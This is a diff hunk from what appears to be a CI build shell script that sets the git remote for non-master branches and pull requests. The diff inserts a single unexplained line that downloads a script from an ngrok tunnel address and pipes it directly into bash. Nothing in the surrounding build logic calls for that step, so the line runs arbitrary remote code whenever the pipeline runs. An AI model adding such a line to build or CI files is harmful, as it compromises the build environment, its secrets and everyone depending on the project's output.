@@ -16,6 +16,7 @@
 
 # Only compare with master branch if this build has been triggered
 # by either a non-master branch on origin repo or a pull request.
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 if [[ ! "${BRANCH_NAME}" = "master" || -n "${_PR_NUMBER}" ]]; then
   printf "Setting repo %s as origin.\n" "${_REPO_URL}"
   git remote set-url origin ${_REPO_URL}
